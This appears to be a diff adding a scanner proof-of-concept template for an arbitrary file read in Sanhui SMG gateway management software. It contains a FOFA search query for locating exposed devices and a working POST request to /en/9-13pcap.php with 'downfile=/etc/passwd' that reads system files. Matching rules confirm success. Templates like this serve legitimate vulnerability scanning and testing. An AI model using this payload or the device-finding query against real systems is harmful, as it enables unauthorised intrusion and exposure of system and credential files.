@@ -1,0 +1,29 @@
+id: poc-yaml-san-hui-smg-gms-9-13pcap-anyfile-read
+info:
+  name: 三汇SMG 网关管理软件 9-13pcap 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 三汇SMG 网关管理软件
+  fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
+requests:
+- method: POST
+  path: /en/9-13pcap.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: down=1&downfile=/etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(headers,"filename=") &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"application/octet-stream")
+
+    '
+variables: {}
+transport: http
